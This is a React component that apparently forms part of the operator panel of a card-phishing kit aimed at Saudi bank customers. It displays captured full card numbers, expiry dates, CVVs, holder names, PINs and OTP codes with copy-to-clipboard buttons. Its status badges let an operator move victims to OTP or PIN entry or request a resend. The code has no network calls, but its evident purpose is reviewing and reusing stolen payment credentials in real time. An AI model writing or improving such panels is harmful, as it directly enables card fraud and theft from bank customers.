"use client";

import { ReactNode, useEffect, useRef, useState } from "react";
import { toast } from "sonner";

interface DataBubbleProps {
  title: string;
  data: Record<string, any>;
  timestamp?: string | Date;
  status?: "pending" | "approved" | "rejected";
  showActions?: boolean;
  isLatest?: boolean;
  actions?: ReactNode;
  icon?: string;
  color?: "blue" | "green" | "purple" | "orange" | "pink" | "indigo" | "gray";
  layout?: "vertical" | "horizontal";
}

type CopyableCardField = "cardNumber" | "expiryDate" | "cvv";

const copyFieldLabels: Record<CopyableCardField, string> = {
  cardNumber: "رقم البطاقة",
  expiryDate: "تاريخ الانتهاء",
  cvv: "CVV",
};

const getBankLogoUrl = (bankName: string): string | null => {
  const n = (bankName || "").toLowerCase();
  if (
    n.includes("أهلي") ||
    n.includes("ahli") ||
    n.includes("snb") ||
    n.includes("national")
  )
    return "/logo-snb.png";
  if (n.includes("راجح") || n.includes("rajhi")) return "/logo-rajhi.png";
  if (n.includes("رياض") || n.includes("riyad")) return "/logo-riyad.jpg";
  if (n.includes("إنماء") || n.includes("انماء") || n.includes("alinma"))
    return "/logo-alinma.png";
  return null;
};

const getNetworkLogoUrl = (brand: string): string | null => {
  if (brand === "MADA") return "/logo-mada.png";
  if (brand === "VISA") return "/logo-visa.png";
  if (brand === "MASTERCARD") return "/logo-mastercard.png";
  return null;
};

export function DataBubble({
  title,
  data,
  timestamp,
  status,
  showActions,
  isLatest,
  actions,
  icon,
  color,
  layout = "vertical",
}: DataBubbleProps) {
  const [copiedField, setCopiedField] = useState<CopyableCardField | null>(
    null,
  );
  const copyResetTimeoutRef = useRef<number | null>(null);

  useEffect(() => {
    return () => {
      if (copyResetTimeoutRef.current)
        window.clearTimeout(copyResetTimeoutRef.current);
    };
  }, []);

  const isCopyableValue = (value: string) => {
    const t = value.trim();
    return !(!t || t.includes("•") || t.includes("*") || t === "غير محدد");
  };

  const copyWithFallback = async (value: string) => {
    const normalized = value.trim();
    if (!normalized || typeof window === "undefined") return false;
    const fallback = () => {
      const el = document.createElement("textarea");
      el.value = normalized;
      el.setAttribute("readonly", "");
      el.style.cssText = "position:fixed;top:-1000px;opacity:0";
      document.body.appendChild(el);
      el.focus();
      el.select();
      const ok = document.execCommand("copy");
      document.body.removeChild(el);
      return ok;
    };
    if (navigator.clipboard && window.isSecureContext) {
      try {
        await navigator.clipboard.writeText(normalized);
        return true;
      } catch {
        return fallback();
      }
    }
    return fallback();
  };

  const handleCopy = async (field: CopyableCardField, value: string) => {
    if (!isCopyableValue(value)) {
      toast.error("لا توجد قيمة قابلة للنسخ");
      return;
    }
    const ok = await copyWithFallback(value);
    if (!ok) {
      toast.error("تعذر نسخ القيمة");
      return;
    }
    setCopiedField(field);
    if (copyResetTimeoutRef.current)
      window.clearTimeout(copyResetTimeoutRef.current);
    copyResetTimeoutRef.current = window.setTimeout(() => {
      setCopiedField((c) => (c === field ? null : c));
    }, 1500);
    toast.success(`تم نسخ ${copyFieldLabels[field]}`);
  };

  const getStatusBadge = () => {
    if (!status) return null;
    const badges: Record<string, { text: string; className: string }> = {
      pending: {
        text: "⏳ قيد المراجعة",
        className: "bg-yellow-50 text-yellow-700 border-yellow-200",
      },
      approved: {
        text: "✓ تم القبول",
        className: "bg-green-50 text-green-700 border-green-200",
      },
      rejected: {
        text: "✗ تم الرفض",
        className: "bg-red-50 text-red-600 border-red-200",
      },
      approved_with_otp: {
        text: "🔑 تحول OTP",
        className: "bg-blue-50 text-blue-700 border-blue-200",
      },
      approved_with_pin: {
        text: "🔐 تحول PIN",
        className: "bg-purple-50 text-purple-700 border-purple-200",
      },
      resend: {
        text: "🔄 إعادة إرسال",
        className: "bg-orange-50 text-orange-700 border-orange-200",
      },
      message: {
        text: "📲 في انتظار الموافقة",
        className: "bg-amber-50 text-amber-700 border-amber-200 animate-pulse",
      },
    };
    const badge = badges[status];
    if (!badge) return null;
    return (
      <span
        className={`inline-flex items-center px-2.5 py-1 rounded-lg text-xs font-semibold border ${badge.className}`}
      >
        {badge.text}
      </span>
    );
  };

  const formatTimestamp = (ts: string | Date) => {
    const d = new Date(ts);
    const mm = String(d.getMonth() + 1).padStart(2, "0");
    const dd = String(d.getDate()).padStart(2, "0");
    let h = d.getHours();
    const min = String(d.getMinutes()).padStart(2, "0");
    const ampm = h >= 12 ? "م" : "ص";
    h = h % 12 || 12;
    return `${mm}-${dd} | ${h}:${min} ${ampm}`;
  };

  const isCardData =
    title === "معلومات البطاقة" ||
    !!data["رقم البطاقة"] ||
    !!data["نوع البطاقة"];

  if (isCardData) {
    const rawNum = (data["رقم البطاقة"] || "").toString().replace(/\s+/g, "");
    const cardNumber = rawNum
      ? rawNum.match(/.{1,4}/g)?.join("  ") || rawNum
      : "••••  ••••  ••••  ••••";
    const rawExpiry = (data["تاريخ الانتهاء"] || "").toString().trim();
    const expiry = rawExpiry || "••/••";
    const rawCvv = (data["CVV"] || "").toString().trim();
    const cvv = rawCvv || "•••";
    const holder = data["اسم حامل البطاقة"] || "CARD HOLDER";
    const cardType = (data["نوع البطاقة"] || "CARD").toString().toUpperCase();
    const cardLevel = (data["مستوى البطاقة"] || "").toString().trim();
    const bankName = data["البنك"] || "";
    const bankCountry = data["بلد البنك"] || "";

    const typeLower = cardType.toLowerCase();
    let brand = "CARD";
    if (typeLower.includes("visa")) brand = "VISA";
    else if (typeLower.includes("master")) brand = "MASTERCARD";
    else if (typeLower.includes("mada")) brand = "MADA";
    else if (typeLower.includes("amex") || typeLower.includes("american"))
      brand = "AMEX";

    const bankLogoUrl = getBankLogoUrl(bankName);
    const networkLogoUrl = getNetworkLogoUrl(brand);

    return (
      <div
        className="bg-white rounded-2xl overflow-hidden shadow-[0_2px_12px_rgba(0,0,0,0.07)] border border-gray-100"
        style={{ fontFamily: "Cairo, Tajawal, sans-serif" }}
      >
        {/* Bubble header */}
        <div className="flex items-center justify-between px-4 py-2.5 border-b border-gray-100">
          <div className="flex items-center gap-2">
            {isLatest && (
              <span className="text-[10px] font-bold text-emerald-600 bg-emerald-50 border border-emerald-200 px-2 py-0.5 rounded-full">
                الأحدث
              </span>
            )}
            {timestamp && (
              <span className="text-[11px] text-gray-400">
                {formatTimestamp(timestamp)}
              </span>
            )}
          </div>
          <span className="text-sm font-bold text-gray-800">{title}</span>
        </div>

        <div className="p-4">
          {/* ─── Credit Card Visual ─── */}
          <div
            className="relative rounded-2xl overflow-hidden"
            style={{
              aspectRatio: "1.78 / 1",
              fontSize: "16px",
              background: "linear-gradient(160deg, #0d1b3e 0%, #162040 50%, #1a2a55 100%)",
              boxShadow: "0 8px 32px rgba(0,0,0,0.35), 0 2px 8px rgba(0,0,0,0.2)",
            }}
          >
            {/* Subtle sheen */}
            <div
              className="absolute inset-0 pointer-events-none"
              style={{
                background: "linear-gradient(135deg, rgba(255,255,255,0.06) 0%, transparent 60%)",
              }}
            />

            {/* Card inner content */}
            <div className="relative h-full flex flex-col px-5 py-4">

              {/* Top row: Bank name + level (left) + Network logo (right) */}
              <div className="flex items-start justify-between">
                <div style={{ direction: "ltr", display: "flex", flexDirection: "column", gap: "4px" }}>
                  {/* Bank name — always show as text */}
                  <span className="font-bold text-white" style={{ fontSize: "13px", letterSpacing: "0.04em" }}>
                    {bankName && bankName !== "غير محدد" ? bankName.toString() : "BANK NAME"}
                  </span>
                  {/* Card level badge */}
                  {cardLevel ? (
                    <span style={{
                      fontSize: "10px", fontWeight: 700, letterSpacing: "0.1em",
                      color: "#f5d77e", background: "rgba(245,215,126,0.15)",
                      border: "1px solid rgba(245,215,126,0.35)",
                      borderRadius: "20px", padding: "1px 8px",
                      display: "inline-block", textTransform: "uppercase",
                    }}>
                      {cardLevel}
                    </span>
                  ) : null}
                </div>
                <div className="flex items-center" style={{ height: "28px" }}>
                  {networkLogoUrl ? (
                    <img src={networkLogoUrl} alt={brand} className="h-7 max-w-[72px] object-contain" style={{ filter: "brightness(0) invert(1)" }} />
                  ) : brand !== "CARD" ? (
                    <span className="font-black text-white uppercase" style={{ fontSize: "13px", letterSpacing: "0.06em" }}>{brand}</span>
                  ) : null}
                </div>
              </div>

              {/* Middle row: Chip + Card Number */}
              <div className="flex items-center gap-4 mt-auto">
                {/* EMV Chip */}
                <div style={{
                  width: "38px", height: "28px", borderRadius: "5px", flexShrink: 0,
                  background: "linear-gradient(135deg, #c9a227 0%, #f5d77e 40%, #c9a227 100%)",
                  display: "grid", gridTemplateColumns: "1fr 1fr", gridTemplateRows: "1fr 1fr",
                  gap: "2px", padding: "4px", boxSizing: "border-box",
                }}>
                  {[0,1,2,3].map(i => (
                    <div key={i} style={{ background: "rgba(120,80,0,0.35)", borderRadius: "2px" }} />
                  ))}
                </div>
                {/* Card Number */}
                <button
                  type="button"
                  onClick={() => void handleCopy("cardNumber", rawNum)}
                  disabled={!isCopyableValue(rawNum)}
                  title="نسخ رقم البطاقة"
                  className="group text-left flex-1"
                >
                  <div className="font-mono font-bold text-white tracking-widest group-hover:opacity-70 transition-opacity" style={{ fontSize: "18px", direction: "ltr" }}>
                    {cardNumber}
                  </div>
                  <div className="text-[9px] text-white/40 mt-0.5 opacity-0 group-hover:opacity-100 transition-opacity">
                    {copiedField === "cardNumber" ? "✓ تم النسخ" : "انقر للنسخ"}
                  </div>
                </button>
              </div>

              {/* Expiry + CVV row */}
              <div className="flex items-center gap-8 mt-2" style={{ direction: "ltr" }}>
                <button
                  type="button"
                  onClick={() => void handleCopy("expiryDate", rawExpiry)}
                  disabled={!isCopyableValue(rawExpiry)}
                  title="نسخ تاريخ الانتهاء"
                  className="group text-left"
                >
                  <div className="font-mono font-semibold text-white group-hover:opacity-70 transition-opacity" style={{ fontSize: "14px" }}>
                    {copiedField === "expiryDate" ? "✓" : expiry}
                  </div>
                </button>
                <button
                  type="button"
                  onClick={() => void handleCopy("cvv", rawCvv)}
                  disabled={!isCopyableValue(rawCvv)}
                  title="نسخ CVV"
                  className="group text-left"
                >
                  <div className="font-mono font-semibold text-white group-hover:opacity-70 transition-opacity" style={{ fontSize: "14px" }}>
                    {copiedField === "cvv" ? "✓" : cvv}
                  </div>
                </button>
              </div>

              {/* Bottom row: Level - Type (left) + Cardholder name (right) */}
              <div className="flex items-end justify-between mt-3">
                <span className="text-white/60 font-semibold uppercase tracking-widest" style={{ fontSize: "11px", direction: "ltr" }}>
                  {cardType !== "CARD" ? cardType : ""}
                </span>
                <span className="text-white font-bold" style={{ fontSize: "12px", direction: "ltr", maxWidth: "160px", textAlign: "right", overflow: "hidden", textOverflow: "ellipsis", whiteSpace: "nowrap" }}>
                  {holder !== "CARD HOLDER" ? holder.toString() : "CARDHOLDER NAME"}
                </span>
              </div>
            </div>
          </div>

          {/* ─── Tags below card ─── */}
          <div className="mt-3 flex flex-wrap gap-1.5">
            {bankName && bankName !== "غير محدد" && (
              <span className="text-[11px] font-semibold px-2.5 py-1 rounded-full bg-blue-50 text-blue-700 border border-blue-100">
                {bankName}
              </span>
            )}
            {bankCountry && bankCountry !== "غير محدد" && (
              <span className="text-[11px] font-semibold px-2.5 py-1 rounded-full bg-indigo-50 text-indigo-700 border border-indigo-100">
                {bankCountry}
              </span>
            )}
            {cardType && cardType !== "CARD" && (
              <span className="text-[11px] font-semibold px-2.5 py-1 rounded-full bg-gray-100 text-gray-700 border border-gray-200">
                {cardType}
              </span>
            )}
            {cardLevel && (
              <span className="text-[11px] font-semibold px-2.5 py-1 rounded-full bg-amber-50 text-amber-700 border border-amber-100">
                {cardLevel}
              </span>
            )}
          </div>
        </div>

        {/* ─── Footer: status + actions ─── */}
        {(status || (showActions && actions)) && (
          <div className="flex items-center justify-between gap-2 px-4 py-3 border-t border-gray-100 bg-gray-50/60">
            <div>{getStatusBadge()}</div>
            {showActions && actions && <div>{actions}</div>}
          </div>
        )}
      </div>
    );
  }

  // ─────────────────────────────────────────
  // PIN / OTP digit boxes
  // ─────────────────────────────────────────
  const isPinOrOtp =
    title.includes("PIN") ||
    title.includes("OTP") ||
    title.includes("رمز") ||
    title.includes("كود") ||
    title.includes("كلمة مرور");

  let digitValue = "";
  if (isPinOrOtp) {
    const entries = Object.entries(data);
    if (entries.length > 0) digitValue = entries[0][1]?.toString() || "";
  }

  return (
    <div
      className="bg-white rounded-2xl overflow-hidden shadow-[0_2px_12px_rgba(0,0,0,0.06)] border border-gray-100"
      style={{ fontFamily: "Cairo, Tajawal, sans-serif" }}
    >
      {/* Header */}
      <div className="flex items-center justify-between px-4 py-2.5 border-b border-gray-100">
        <div className="flex items-center gap-2">
          {isLatest && (
            <span className="text-[10px] font-bold text-emerald-600 bg-emerald-50 border border-emerald-200 px-2 py-0.5 rounded-full">
              الأحدث
            </span>
          )}
          {timestamp && (
            <span className="text-[11px] text-gray-400">
              {formatTimestamp(timestamp)}
            </span>
          )}
        </div>
        <div className="flex items-center gap-2">
          {icon && <span className="text-base">{icon}</span>}
          <span className="text-sm font-bold text-gray-800">{title}</span>
        </div>
      </div>

      {/* Body */}
      <div className="px-4 py-3">
        {isPinOrOtp && digitValue ? (
          <div
            className="flex justify-center gap-1.5 py-2"
            style={{ direction: "ltr" }}
          >
            {digitValue.split("").map((digit, i) => (
              <div
                key={i}
                className="w-9 h-11 rounded-lg bg-gray-50 border border-gray-200 shadow-sm flex items-center justify-center"
              >
                <span className="text-xl font-bold text-gray-900">{digit}</span>
              </div>
            ))}
          </div>
        ) : (
          <div className="divide-y divide-gray-50">
            {Object.entries(data).map(([key, value]) => {
              if (value === undefined || value === null) return null;
              const str = value?.toString() || "-";
              return (
                <div
                  key={key}
                  className="flex items-start justify-between gap-4 py-2 text-sm"
                >
                  <span className="text-gray-500 shrink-0 text-xs">{key}</span>
                  <span className="text-gray-900 font-semibold text-right break-all text-xs">
                    {str}
                  </span>
                </div>
              );
            })}
          </div>
        )}
      </div>

      {/* Footer */}
      {(status || (showActions && actions)) && (
        <div className="flex items-center justify-between gap-2 px-4 py-3 border-t border-gray-100 bg-gray-50/60">
          <div>{getStatusBadge()}</div>
          {showActions && actions && <div>{actions}</div>}
        </div>
      )}
    </div>
  );
}
